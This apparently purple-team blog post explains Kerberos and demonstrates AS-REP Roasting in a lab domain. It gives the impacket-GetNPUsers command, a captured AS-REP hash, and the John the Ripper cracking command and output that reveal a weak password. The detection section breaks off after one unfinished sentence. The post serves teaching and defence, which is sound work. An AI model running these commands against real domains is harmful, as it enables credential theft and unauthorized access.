---
title: AS-REP Roasting - MITRE ATT&CK T1558.004
date: 2025-04-27 13:00:00 
categories: [Purple Team,Active Directory & Kerberos Abuse]
tags: [active directory,asrep roasting,hashcat]     # TAG names should always be lowercase
comments: true
image:
  path: /.
---
Hello everyone, thank you for being here. In this blog post, I will demonstrate and simulate a very interesting Active Directory and Kerberos abuse attack: the **AS-REP Roasting** attack. So, let's get started!
## What is Kerberos ?
Kerberos is a network authentication protocol designed to provide strong authentication for client-server applications using ticket-based cryptography. Developed by MIT, it is the default authentication mechanism in Microsoft Active Directory (AD) environments.
### Kerberos components :
Kerberos authentication involves three main components:

- **Key Distribution Center (KDC)** – The central authority that issues tickets, the KDC has two main components :
  - **Authentication Service (AS)** – Verifies user identity and issues Ticket-Granting Tickets (TGTs).
  - **Ticket-Granting Service (TGS)** – Grants service tickets for accessing resources.

- **Client** – The user or service requesting access.

- **Service Server** – The resource the client wants to access (e.g., a file share, SQL server).
### The Kerberos Authentication Flow (simplified) :

1. **AS-REQ** (Authentication Service Request) : – The client requests a TGT from the AS.

2. **AS-REP** (Authentication Service Reply) : – If pre-authentication is enabled, the AS verifies the user’s credentials and sends an encrypted TGT.

3. **TGS-REQ** (Ticket-Granting Service Request) : – The client sends the TGT to the TGS to request a service ticket.

4. **TGS-REP** (Ticket-Granting Service Reply) : – The TGS issues a service ticket for the requested resource.

5. **AP-REQ** (Application Request) : – The client presents the service ticket to the target server.

6. **AP-REP** (Application Reply) : – The server grants access.

this image below represents the kerberos flaw, as stated before :

![screen_1](/./media/post5/krbmsg.gif)

## AS_REP Roasting :
**AS-REP Roasting** exploits a weakness in Kerberos when **pre-authentication** is disabled for a user account. Without pre-authentication, an attacker can request a TGT (no password aka anyone can) for the user and receive an encrypted AS-REP message, which can be cracked offline to reveal the user’s password. Luckily in **Kerberos v5** the preauth is enabled by default and you have to manually disable it, the only reason i think sys admin would disble it is for backward compatibility with Kerberos v4 libraries that might be used by some legacy applications,those account by default do not require a password.
## Lab Simulation: AS-REP Roasting Attack Demonstration :
In this practical demonstration, we'll simulate an **AS-REP Roasting** attack in our test environment and identify **key Indicators of Compromise (IOCs)** that would alert defenders to such malicious activity.

**Lab Environment Details:**

- Target Domain: **b2hu.local**

- Vulnerable Account: **jdoe@b2hu.local** (pre-authentication disabled)

- Alternative Format: **b2hu/jdoe**
the **jdoe** user properties must be set up with preauth disabled just as follows : 
![screen_2](/./media/post5/jdoe_prop.png)

### Attacking the DC
for the asrep abuse we'll use the impacket script **GetNPUsers.py** script :
```shell
impacket-GetNPUsers -no-pass b2hu.local/jdoe -dc-ip 10.120.116.9
```
after execuring this command we'll get the tgt encrypted wiht the user jdoe password's hash, just as follows :
```shell
$krb5asrep$23$jdoe@B2HU.LOCAL:653ff5ebc4ad4664ca981a81d99e5d25$230752522416c1b67374660dbe8adbf5676915d8ecf69c2b2b8907857752d022a43d7cb7b5d86466c8298052ca13fb73691beee998ff6b24adfa1e9e0e0d7849b6b5b50ed9e82a40a1aec478f860ab251a910db20538503dd112acf3ed6615d499db123454a494bbc0d6e68aa920e9242ed3816f4ae3869736f9a2a018d7f3a131e8e89badbe5d7f78378a82c1cd709892c3ae53c42c1b09ff22df294900a937db02cf02d9d4cda4614bbaef163f2b9683ec205978af08111ac5b891e2c8cebf10f63964ea53bac74643fd4b9ae67df13715d93799266caa919fe567c42e52a086b5f5a4eadc372f
```
now we can move to offline cracking, we can use tools like hashcat or JTR (john the ripper), for this demo i'll user JTP with rockyou.txt password list, the command is like this : 
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt tgt.txt 
```
after a while (depending on the domain password policy), we can get this output :
```shell
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      ($krb5asrep$23$jdoe@B2HU.LOCAL)     
1g 0:00:00:00 DONE (2025-04-28 23:28) 6.250g/s 211200p/s 211200c/s 211200C/s katten..redlips
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
as we can see the password of the **b2hu/jdoe** user is **Password123** 
and just like that the attacker has now a foothold in your domaina and can perfom even more enumeration to find weakspots.

### Detecting & respond the Attack

while requesting the tgt ticket the windows event log, 


